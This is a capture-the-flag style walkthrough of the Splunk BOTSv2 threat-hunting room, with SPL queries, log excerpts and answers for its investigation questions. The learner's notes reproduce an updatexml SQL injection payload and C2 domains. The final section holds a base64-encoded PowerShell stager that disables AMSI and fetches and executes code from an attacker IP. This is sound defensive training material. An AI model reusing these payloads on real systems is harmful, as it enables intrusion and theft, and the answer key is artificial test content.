---
Part of the Blue Primer series. This room is based on version 2 of the Boss of the SOC (BOTS) competition by Splunk.
---

![](https://assets.tryhackme.com/additional/splunk-overview/splunk2-room-banner.png)

### Deploy! 

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-botsv2-2017.png)

BOTSv2 Dataset:

The data included in this app was generated in August of 2017 by members of Splunk's Security Specialist team - Dave Herrald, Ryan Kovar, Steve Brant, Jim Apger, John Stoner, Ken Westin, David Veuve and James Brodsky. They stood up a few lab environments connected to the Internet. Within the environment they had a few Windows endpoints instrumented with the Splunk Universal Forwarder and Splunk Stream. The forwarders were configured with best practices for Windows endpoint monitoring, including a full Microsoft Sysmon deployment and best practices for Windows Event logging. The environment included a Palo Alto Networks next-generation firewall to capture traffic and provide web proxy services, and Suricata to provide network-based IDS. 

Note: This information is from the Advanced Hunting APTs with Splunk app. 

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-botsv2-app.png)

BOTSv2 Github: https://github.com/splunk/botsv2

It is recommended that you complete the Splunk 101 room before attempting this room. 

Room Machine

Before moving forward, deploy the Splunk virtual machine.

From the AttackBox, open Firefox Web Browser and navigate to the Splunk instance (http://10.10.176.25:8000).

You may need to refresh the page until Splunk loads. This can take up to five minutes to launch. 


Deployed the virtual machine and connected to the website found at 10.10.176.25:8000
*No answer needed*

### Dive into the data 

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-botsv2-frothly.png)

In this exercise, you assume the persona of Alice Bluebird, the analyst who successfully assisted Wayne Enterprises and was recommended to Grace Hoppy at Frothly (a beer company) to assist them with their recent issues.

What Kinds of Events Do We Have?

The SPL (Splunk Search Processing Language) command metadata can be used to search for the same kind of information that is found in the Data Summary, with the bonus of being able to search within a specific index, if desired. All time-values are returned in EPOCH time, so to make the output user readable, the eval command should be used to provide more human-friendly formatting.

In this example, we will search the botsv2 index and return a listing of all the source types that can be found as well as a count of events and the first time and last time seen.

Resources:

    http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/Metadata
    https://www.splunk.com/blog/2017/07/31/metadata-metalore.html

Metadata command:

```
| metadata type=sourcetypes index=botsv2 | eval firstTime=strftime(firstTime,"%Y-%m-%d %H:%M:%S") | eval lastTime=strftime(lastTime,"%Y-%m-%d %H:%M:%S") | eval recentTime=strftime(recentTime,"%Y-%m-%d %H:%M:%S") | sort - totalCount
```

Note: This information is from the Advanced Hunting APTs with Splunk app. 
I'm ready to get hunting with Splunk.
*No answer needed*

### 100 series questions 



The questions below are from the BOTSv2 dataset, questions 100-104. Some additional questions were added. 

In this task, we'll attempt to help guide you to each question's answer.

Note: The approach outlined in this task is not the only approach to tackle each question. 

Reading the questions below, the focus is on Amber Turing and her communication with a competitor.

Question 1

The first objective is to find out what competitor website she visited. What is a good starting point?

When it comes to HTTP traffic, the source and destination IP addresses should be recorded in logs. You need Amber's IP address.

You can start with the following command, index="botsv2" amber, and see what events are returned. Look at the events on the first page. 

Amber's IP address is visible in the events related to PAN traffic, but it's not straightforward. 

To get her IP address, we can hone in on the PAN traffic source type specifically. 

Command: index="botsv2" sourcetype="pan:traffic"

From here, you should have Amber's IP address. You can build a new search query using this information.

It would be best if you used the HTTP stream source type in your new search query. 

Using Amber's IP address, construct the following search query. 

Command: index="botsv2" IPADDR sourcetype="stream:HTTP"

You must substitute IPADDR with Amber's IP address.

After this query executes, there are many events to sift through for the answer. How else can you narrow this down?

Look at the additional fields.

Another field you can add to the search query to further shrink the returned events list is the site field.

Think about it; you're investigating what competitor website Amber visited.

Expand the search query only to return the site field. Additionally, you can remove duplicate entries and display the results nicely in a table. 

Command: index="botsv2" IPADDR sourcetype="stream:HTTP" | KEYWORD site | KEYWORD site

You must substitute KEYWORD with the Splunk commands to remove the duplicate entries and display the output in a table format.

Note: The first KEYWORD is to remove the duplicate entries, and the second is to display the output in a table format. 

The results returned to show the URIs that Amber visited, but which website is the one that you're looking for?

To help answer these questions: Who does Amber work for, and what industry are they in? 

The competitor is in the same industry. The competitor website now should clearly be visible in the table output.

Extra: You can also use the industry as a search phrase to narrow down the results to a handful of events (1 result to be exact). 

Command: index="botsv2" IPADDR sourcetype="stream:HTTP" *INDUSTRY* | KEYWORD site | KEYWORD site

Note: Use asterisks to surround the search term.

Questions 2-7

Amber found the executive contact information and sent him an email. Based on question 2, you know it's an image.

Since you now know the competitor website, you can construct a more specific search query isolating the results to focus on Amber's HTTP traffic to the competitor website. 

Command: index="botsv2" IPADDR sourcetype="stream:HTTP" COMPETITOR_WEBSITE

Replace COMPETITOR_WEBSITE with the actual URI of the competitor website. 

You can expand on the search query to output the specific field you want in a table format for an easy-to-read format, as we did for the previous objective. 

Based on the image, you have the CEO's last name but not his first name. Maybe you can get the name in the email communication.

You can now draw your attention to email traffic, SMTP, but you need Amber's email address. You should be able to get this on your own. :)

Once you have Amber's email address, you can build a search query to focus on her email address and the competitor's website to find events that show email communication between Amber and the competitor. 

Command: index="botsv2" sourcetype="stream:smtp" AMBERS_EMAIL COMPETITOR_WEBSITE

Replace AMBERS_EMAIL with her actual email address. 

With the returned results from the above search query, you can answer your own remaining questions. :)


```
search for all time 
index="botsv2" sourcetype="pan:traffic" amber
then open more client_ip
	10.0.2.101

index="botsv2" 10.0.2.101 sourcetype="stream:HTTP" NOT(site=*.microsoft.com OR site=*.windowsupdate.com OR site=*.bing.com OR site=*.digicert.com OR site=*.akamaized.net OR site=*msn.com OR site=*.adnxs.com OR *office.net OR *symcd.com OR site=*gvt1*)
| dedup site 
| table site

em.vindale.com
www.vindale.com
uranus.frothly.local:8014
www.berkbeer.com (correct)

index="botsv2" 10.0.2.101 sourcetype="stream:HTTP" www.berkbeer.com *ceo*
 
 uri_path: /images/ceoberk.png 

index="botsv2" sourcetype="stream:smtp" amber

 sender: Amber Turing <aturing@froth.ly>
   sender_alias: Amber Turing
   sender_email: aturing@froth.ly 

index="botsv2" sourcetype="stream:smtp" aturing@froth.ly berkbeer*
 sender_email: mberk@berkbeer.com 

index="botsv2" sourcetype="stream:smtp" aturing@froth.ly berk*
Give me a call this afternoon if you=
 are free.=C2=A0=0A=0AMartin Berk=0ACEO=0A777.222.8765=0Amberk@berkbeer.=
com=0A=0A----- Original Message -----=0AFrom: "Amber Turing" 

[+] press content

index="botsv2" sourcetype="stream:smtp" aturing@froth.ly hbernhard@berkbeer.com
[+] attach_filename
Saccharomyces_cerevisiae_patent.docx 

index=botsv2 sourcetype="stream:smtp" "aturing@froth.ly" "hbernhard@berkbeer.com"
[+]Content Body

VGhhbmtzIGZvciB0YWtpbmcgdGhlIHRpbWUgdG9kYXksIEFzIGRpc2N1c3NlZCBoZXJlIGlzIHRo
ZSBkb2N1bWVudCBJIHdhcyByZWZlcnJpbmcgdG8uICBQcm9iYWJseSBiZXR0ZXIgdG8gdGFrZSB0
aGlzIG9mZmxpbmUuIEVtYWlsIG1lIGZyb20gbm93IG9uIGF0IGFtYmVyc3RoZWJlc3RAeWVhc3Rp
ZWJlYXN0aWUuY29tPG1haWx0bzphbWJlcnN0aGViZXN0QHllYXN0aWViZWFzdGllLmNvbT4NCg0K
RnJvbTogaGJlcm5oYXJkQGJlcmtiZWVyLmNvbTxtYWlsdG86aGJlcm5oYXJkQGJlcmtiZWVyLmNv
bT4gW21haWx0bzpoYmVybmhhcmRAYmVya2JlZXIuY29tXQ0KU2VudDogRnJpZGF5LCBBdWd1c3Qg
MTEsIDIwMTcgOTowOCBBTQ0KVG86IEFtYmVyIFR1cmluZyA8YXR1cmluZ0Bmcm90aC5seTxtYWls
dG86YXR1cmluZ0Bmcm90aC5seT4+DQpTdWJqZWN0OiBIZWlueiBCZXJuaGFyZCBDb250YWN0IElu
Zm9ybWF0aW9uDQoNCkhlbGxvIEFtYmVyLA0KDQpHcmVhdCB0YWxraW5nIHdpdGggeW91IHRvZGF5
LCBoZXJlIGlzIG15IGNvbnRhY3QgaW5mb3JtYXRpb24uIERvIHlvdSBoYXZlIGEgcGVyc29uYWwg
ZW1haWwgSSBjYW4gcmVhY2ggeW91IGF0IGFzIHdlbGw/DQoNClRoYW5rIFlvdQ0KDQpIZWlueiBC
ZXJuaGFyZA0KaGVybmhhcmRAYmVya2JlZXIuY29tPG1haWx0bzpoZXJuaGFyZEBiZXJrYmVlci5j
b20+DQo4NjUuODg4Ljc1NjMNCg0K 

(decoding cyberchef)

Thanks for taking the time today, As discussed here is the document I was referring to.  Probably better to take this offline. Email me from now on at ambersthebest@yeastiebeastie.com<mailto:ambersthebest@yeastiebeastie.com>

From: hbernhard@berkbeer.com<mailto:hbernhard@berkbeer.com> [mailto:hbernhard@berkbeer.com]
Sent: Friday, August 11, 2017 9:08 AM
To: Amber Turing <aturing@froth.ly<mailto:aturing@froth.ly>>
Subject: Heinz Bernhard Contact Information

Hello Amber,

Great talking with you today, here is my contact information. Do you have a personal email I can reach you at as well?

Thank You

Heinz Bernhard
hernhard@berkbeer.com<mailto:hernhard@berkbeer.com>
865.888.7563

```
Amber Turing was hoping for Frothly to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited?
*www.berkbeer.com*

Amber found the executive contact information and sent him an email. What image file displayed the executive's contact information? Answer example: /path/image.ext
*/images/ceoberk.png *

What is the CEO's name? Provide the first and last name.
*Martin Berk*
What is the CEO's email address?
*mberk@berkbeer.com*

After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?
*hbernhard@berkbeer.com*

What is the name of the file attachment that Amber sent to a contact at the competitor?
*Saccharomyces_cerevisiae_patent.docx *

What is Amber's personal email address?
*ambersthebest@yeastiebeastie.com*

### 200 series questions 



In this task, we'll attempt to tackle the 200 series questions from the BOTSv2 dataset. 

Note: As noted in the previous task, this guide is not the only way to query Splunk for the answers to the questions below. 

Question 1

Our first task is to identify the version of Tor that Amber installed. You can use a keyword search to get you started.

What are some good keywords? Definitely Amber. Another would be Tor. Give that a go.

Command: index="botsv2" amber tor

Over 300 results are returned. You can reverse the order of results (hoping the 1st event is the TOR installation) and see if you can get the answer.

You should add another keyword to this search query. I'll leave that task to you.

Command: index="botsv2" amber tor KEYWORD

Replace the KEYWORD with another search term to help narrow down the events to the answer. 

Questions 2 & 3

You need to determine the public IP address for brewertalk.com and the IP address performing a web vulnerability scan against it. 

You should be able to tackle this one on your own. Use the previous search queries as your guide. 

Questions 4 & 5

Now that you have the attacker IP address, build your new search query with the attacker IP as the source IP.

Command: index="botsv2" src_ip="ATTACKER_IP"

Tip: Change the Sampling to 1:100 or your query will auto-cancel and throw errors. 

Yikes! The number of events returned is over 18,000 .. but that is fine. 

Use the Interesting Fields to help you identify what the URI path that is being attacked is.

Once the URI path has been identified, you can use it to expand the search query further to determine what SQL function is being abused. 

Command: index="botsv2" src_ip="ATTACKER_IP" uri_path="URI_PATH"

You should have over 600 events to sift through but fret not; the answer is there. 

Questions 6 & 7

Awesome, thus far, you have identified Amber downloaded Tor Browser (you even know the exact version). You identified what URI path and the SQL function attacked on brewertalk.com.

Your task now is to identify the cookie value that was transmitted as part of an XSS attack. The user has been identified as Kevin. 

Before diving right in, get some details on Kevin. This is the first time you hear of him.

Command: index="botsv2" kevin

Ok, now you have Kevin's first and last name. Time to figure out the cookie value from the XSS attack.

As before, you can start with a simple keyword search.

You know that you're looking for events related to Kevin's HTTP traffic with an XSS payload, and you're focused on the cookie value.

Honestly, you should be able to tackle this one on your own as well. Use the previous search queries as your guide. 

After you executed the search query that yields the events with the answer, you can identify the username used for the spear phishing attack. 

Based on the question hint, you can perform a keyword search query here as well.

Command: index="botsv2" KEYWORD

As times before, replace KEYWORD with the actual keyword search term.

Great! You should have been able to find all the answers to the questions using basic keyword searches.

```
index="botsv2" amber tor.exe

process torbrowser-install-7.0.4_en-US.exe

index="botsv2" www.brewertalk.com
dest_ip  52.42.208.228 	473 	4.399%
src_ip    45.77.65.211 	8,965

index="botsv2" www.brewertalk.com 52.42.208.228
uri_path   /member.php 	3 	0.775%

index="botsv2" brewertalk.com src_ip="45.77.65.211" uri_path="/member.php" 
| dedup form_data 
| table form_data

regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit Registration!&question_id=makman' and updatexml(NULL,concat (0x3a,(SUBSTRING((SELECT password FROM mybb_users ORDER BY UID LIMIT 5,1), 32, 31))),NULL) and '1 

updatexml

index="botsv2" kevin sourcetype="stream:http" tag="error"
| table cookie

cookie
mybb[lastvisit]=1502408189; mybb[lastactive]=1502408191; sid=4a06e3f4a6eb6ba1501c4eb7f9b25228; adminsid=9267f9cec584473a8d151c25ddb691f1; acploginattempts=0

1502408189

index="botsv2" 1bc3eab741900ab25c98eee86bf20feb 
| table form_data

statistics
my_post_key=1bc3eab741900ab25c98eee86bf20feb&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4

kIagerfield

```


What version of TOR Browser did Amber install to obfuscate her web browsing? Answer guidance: Numeric with one or more delimiter.
*7.0.4*

What is the public IPv4 address of the server running www.brewertalk.com?(Public IP, not private.)
*52.42.208.228*

Provide the IP address of the system used to run a web vulnerability scan against www.brewertalk.com.
*45.77.65.211*

The IP address from Q#2 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: /phpinfo.php
*/member.php*


What SQL function is being abused on the URI path from the previous question? (Look at the form_data field.)
*updatexml*

What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of an XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.
*1502408189*   (XSS is associated with what tag?)


What brewertalk.com username was maliciously created by a spear phishing attack?
(The attacker stole Kevin's CSRF token (1bc3eab741900ab25c98eee86bf20feb) and performed a trick from domain squatters by using a homograph attack.)
The internationalized domain name (IDN) _homograph attack_ is a way a malicious party may deceive computer users about what remote system
*kIagerfield*

### 300 series questions 

Upward and onwards! Time to tackle some of the 300 series questions.

As with the 100 series questions, there are extra questions in this task that are not from the BOTS2 dataset. 

Questions 1 & 2

The questions start with an individual named Mallory, her MacBook, and some encrypted files. 

As per the previous tasks, you can start with a keyword search to see what events are returned that are associated with Mallory.

Command: index="botsv2" mallory

Over 11,000 events are returned, but if you draw your attention to the Selected Fields, you should get the name of her MacBook.

Ok, build a new search query with just the name of her MacBook and see what you get.

Command: index="botsv2" host="NAME_MACBOOK"

Note: You don't have to run this command. Trust me; the results returned are well over 9 million events.

Looking back at the question (our objective), the focus is on a critical PowerPoint presentation.

Add common file extensions for PowerPoint to help significantly shrink the amount of returned events. 

Command: index="botsv2" host="NAME_MACBOOK" (*.ppt OR *.pptx)

Nice! You should have the filename of the critical document. 

Now you need to find another file, this time a movie file.

Use the same source type from the previous query that returned the event with the filename of the critical PowerPoint document.

Since you don't know the file extension, you can't use the same approach as before.

What do you know? You know the file extension of the files once they have been encrypted.

You can use that file extension in your search query.

Command: index="botsv2" host="NAME_MACBOOK" sourcetype="?" *.EXT

Replace the ? with the name of the source type and .EXT with the actual encryption file extension. 

After execution, you should see the results are over 1,000, but the answer should be on the first page of the results. 

Questions 3-7

Next task, you need to provide the name of the manufacturer of the USB drive Kevin used on Mallory's personal MacBook (kutekitten). 

You can search for the malware or search for the USB manufacturer (vendor). In either case, you need to start with the MacBook.

You know the drill, start with a simple keyword search using the name of the MacBook.

Command: index="botsv2" kutekitten

The number of returned events is over 6,000, and the 2 data sources/source types are related to Osquery. 

What is Osquery?

"Osquery exposes an operating system as a high-performance relational database. This allows you to write SQL queries to explore operating system data. With Osquery, SQL tables represent abstract concepts such as running processes, loaded kernel modules, open network connections, browser plugins, hardware events or file hashes."

Tip: Visit the Osquery room to learn more. 

Look through some of the events and get familiar with the structure of the data. 

Back to the search, a good place to start searching for the malware is in Mallory's user folders. Find it in the search results from the last command.  

Once you have it, expand the search query with the user path and try different folders. 

Command: `index="botsv2" kutekitten "\\/PATH\\/MALLORY\\/FOLDER"`

Replace `\\/PATH\\/MALLORY\\/FOLDER` with Mallory's user folder path. For the search query to successfully execute, the path needs to be double escaped. 

Look at the other available interesting fields related to a path that you can use to add as a field to the search query and look for an interesting file that stands out once you've used the added field as part of the query.

Hint: You know you have found the interesting file if the available field shows a count of 1. 

Once you think you found the file (you can confirm the file's hash in VirusTotal), pivot, and look at the events 1 minute prior. 

To do this, click on the date/time of the event. A new window will pop up that will allow you to view events before or after that specific point in time.

![](https://assets.tryhackme.com/additional/splunk-overview/splunk-time-correlation.png)

Now you need to run a new search query to focus on events within the specific time segment. 

It would be a good idea to refer to the documentation on Osquery here to help you with this. 

Command: index="botsv2" kutekitten KEYWORD KEYWORD

Don't forget to replace the KEYWORD with the actual keywords you think will help you narrow down your search. 

Note: The events will not provide the name of the USB manufacturer; you need to perform external research on the ID value to get that answer.

For questions 4-7, you have enough at this point to help you get the answers to those questions. :)

```
index="botsv2" mallory

 host = MACLORY-AIR13 

index="botsv2" mallory host="MACLORY-AIR13" (*.ppt OR *.pptx)

mallorykraeuse   20275     ?      0.0       0:00.10     0.0       2128    2442472   ??       U         00:07  zip                 -0_-P_UH9PUnpePPK0vYybBKRdMukR_/Volumes//FROTHLY/Home/mallory.kraeusen/Frothly_marketing_campaign_Q317.pptx.crypt_/Volumes//FROTHLY/Home/mallory.kraeusen/Frothly_marketing_campaign_Q317.pptx

index="botsv2" got (*.crypt)

mallorykraeuse    2356     ?      0.0       0:00.00     0.0       2944    2433916   ttys000  S         00:08  unzip               GoT.S07E02.BOTS.BOTS.BOTS.mkv.crypt

index="botsv2" kutekitten usb name="pack_hardware-monitoring_usb_devices"

 vendor: Generic
     vendor_id: 058f (googling)
Alcor Micro Corp

index="botsv2" kutekitten "\\/Users*"

"decorations.username"=mkraeusen


index="botsv2" kutekitten "\\/Users*" "decorations.username"=mkraeusen

index="botsv2" kutekitten "\\/Users*" "decorations.username"=mkraeusen "columns.md5"=72d4d364ed91dd9418d144a2db837a6d

md5 virustotal -> TrID

[Perl script (36.3%)] backdoor 
### Names

-   fpsaud
 -   fpsaud.txt

First Seen In The Wild

2017-01-17 19:09:06 UTC

eidk[.]duckdns[.]org defanging url cyberchef (from virustotal)

eidk[.]hopto[.]org

```


Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. What is the name of this file after it was encrypted?
*Frothly_marketing_campaign_Q317.pptx.crypt*

There is a Games of Thrones movie file that was encrypted as well. What season and episode is it? (The season and episode is in the filename.)
*S07E02*

Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive.
*Alcor Micro Corp*


What programming language is at least part of the malware from the question above written in?
*Perl*


When was this malware first seen in the wild? Answer Guidance: YYYY-MM-DD
*2017-01-17*

The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?
*eidk[.]duckdns[.]org* (without [])


From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?
*eidk[.]hopto[.]org* (without [])

### 400 series questions 



Continuing on, it's time to attempt to answer some of the 400 series questions from the BOTS2 dataset and then some. 

Questions 1 & 2

You're tasked to find the name of the attachment sent to Frothly by the malicious APT actor. This will involve events related to emails.

You're provided with a command that will lead you to the answer. Replace the ? and .EXT with the appropriate values. 

Command: index="botsv2" sourcetype="stream:?" *.EXT

You should be able to retrieve the password on your own at this point. :)

Question 3

For this question, you will need the attacker's IP. Remember, there was an IP address scanning brewertalk.com.

Use that IP address and search the TCP stream instead of the HTTP stream.

Once the events are returned, look at the Interesting Fields. 

Command: index="botsv2" sourcetype="stream:?" ATTACKER_IP

Question 4

Next task, find an unusual file that was downloaded with winsys32.dll.

Notice that it's mentioned that this file would be considered unusual for an American company. This is a hint that it has something to do with language. 

Command: index="botsv2" winsys32.dll

Look through the results; you should see a tool associated with transferring files from system to system. 

There is a source type associated with the binary. Use that to start a new search query.

Command: index="botsv2" sourcetype="stream:?"

Replace the ? with the appropriate value. 

Over 1,000 events are returned. It might be a good idea to shrink this further down. But how?

You're looking for an unusual file that was downloaded by the winsys32.dll. Research commands that can be utilized with the tool that is specific to downloads. Once you find the command, expand your search query. 

Command: index="botsv2" sourcetype="stream:?" method=COMMAND

You know the drill, replace the ? and COMMAND with the appropriate values.

The unusual file should be noticeable in the returned events. If not, then look at the Interesting Fields. 

Questions 5 & 6

Use the following links to examine the execution of the malware contained within the aforementioned zip file. 

    Hybrid Analysis - https://www.hybrid-analysis.com/sample/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/598155a67ca3e1449f281ac4
    VirusTotal - https://www.virustotal.com/gui/file/d8834aaa5ad6d8ee5ae71e042aca5cab960e73a6827e45339620359633608cf1/detection
    Any.run - https://app.any.run/tasks/15d17cd6-0eb6-4f52-968d-0f897fd6c3b3

These sources will help you find the answer to this question, along with the following question.

Question 7

I'm confident you can tackle this one solo. Below is a command to get you started.

Command: index="botsv2" schtasks.exe

The amount returned should be over 100 events. Look at the returned results. Some entries should stand out. Next figure out what keyword(s) and source type you need to find the answer. 

You'll need to perform additional steps for each event to determine the answer to the last question. Good luck! :)


```
index="botsv2" frothly *.zip sourcetype=wineventlog

Process Command Line:	"C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\billy.tun\AppData\Local\Temp\Temp1_invoice.zip\invoice.doc" /o "u"
Show all 33 lines

    host = wrk-btun
    source = WinEventLog:Security
    sourcetype = wineventlog

invoice.zip

index="botsv2" invoice.zip password 
| spath "content_body{}" | table "content_body{}"

<div data-node-type=3D"line" id=3D"magicdomid2">
<div data-node-type=3D"line" id=3D"magicdomid2">
<div data-node-type=3D"line" id=3D"magicdomid2">As we have not received a =
service cessation letter, I am assuming that you might have accidentally =
overlooked this invoice &lsquo;02/160000506500 (Unpaid)&rsquo; for 10,000 =
GBP. Should you wish to bring an end to the agreement please let us know. =
Otherwise early withdrawal penalties will apply next month.&nbsp;</div>
<div data-node-type=3D"line" id=3D"magicdomid3">&nbsp;</div>
<div data-node-type=3D"line" id=3D"magicdomid4">Pleaser refer to the =
attached document for payment details. Due to the personal nature of the =
account we have added a password to the document. Please enter the =
password (912345678).</div>

index="botsv2" ssl

ssl_issuer C = US

index="botsv2" winsys32.dll (ftp)

index="botsv2" sourcetype="stream:ftp" | stats count by method (RETR)

index="botsv2" sourcetype="stream:ftp" method="RETR"

 method_parameter: 나는_데이비드를_사랑한다.hwp 

hybrid analisis

Ryan Kovar (Author: Ryan Kovar / invoice.doc)

Any.run 

CyberEastEgg (found in doc)

index="botsv2" \\Software\\Microsoft\\Network sourcetype=WinRegistry

data

WwBSAEUARgBdAC4AQQBTAFMAZQBNAEIAbABZAC4ARwBFAHQAVAB5AHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAGUAVABGAEkAZQBMAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBsAFUAZQAoACQAbgBVAGwAbAAsACQAdABSAHUAZQApAH0AOwBbAFMAeQBzAHQAZQBtAC4ATgBFAFQALgBTAGUAUgB2AGkAQwBFAFAAbwBJAG4AdABNAEEATgBBAEcARQByAF0AOgA6AEUAWABQAGUAYwB0ADEAMAAwAEMAbwBuAFQAaQBOAHUAZQA9ADAAOwAkAFcAYwA9AE4AZQB3AC0ATwBiAEoARQBDAFQAIABTAFkAUwBUAGUATQAuAE4ARQBUAC4AVwBlAEIAQwBsAEkAZQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAVwBjAC4ASABlAEEARABlAFIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBjAC4AUABSAG8AeABZAD0AWwBTAFkAUwB0AGUAbQAuAE4ARQBUAC4AVwBFAEIAUgBlAHEAdQBFAFMAdABdADoAOgBEAEUARgBhAFUAbABUAFcAZQBCAFAAcgBPAHgAWQA7ACQAVwBjAC4AUAByAE8AWAB5AC4AQwBSAGUAZABFAG4AdABpAGEAbABTACAAPQAgAFsAUwBZAHMAVABFAE0ALgBOAEUAVAAuAEMAUgBlAGQAZQBOAHQAaQBBAEwAQwBhAGMAaABFAF0AOgA6AEQAZQBGAEEAdQBMAFQATgBFAHQAVwBvAHIAawBDAHIAZQBEAGUATgB0AGkAYQBsAHMAOwAkAEsAPQBbAFMAWQBzAFQAZQBtAC4AVABlAFgAVAAuAEUAbgBjAE8ARABJAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAHkAdABlAHMAKAAnADMAOAA5ADIAOAA4AGUAZABkADcAOABlADgAZQBhADIAZgA1ADQAOQA0ADYAZAAzADIAMAA5AGIAMQA2AGIAOAAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAUwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgATwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAEQARQBSAHMALgBBAGQARAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AHcASQBuAFUAMgBVAGIAVwB2AGQALwBTAGQATwBqAGoAVgB0AGEAMABCAEgAYQBaAEgAagBJAD0AIgApADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvADQANQAuADcANwAuADYANQAuADIAMQAxADoANAA0ADMAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQARABhAFQAQQA9ACQAVwBDAC4ARABvAHcATgBsAG8AQQBkAEQAQQBUAEEAKAAkAHMARQByACsAJABUACkAOwAkAGkAdgA9ACQARABhAFQAQQBbADAALgAuADMAXQA7ACQAZABBAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAQQAuAGwAZQBuAEcAVABIAF0AOwAtAGoATwBpAE4AWwBDAGgAQQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAFQAQQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA

decode cyberchef

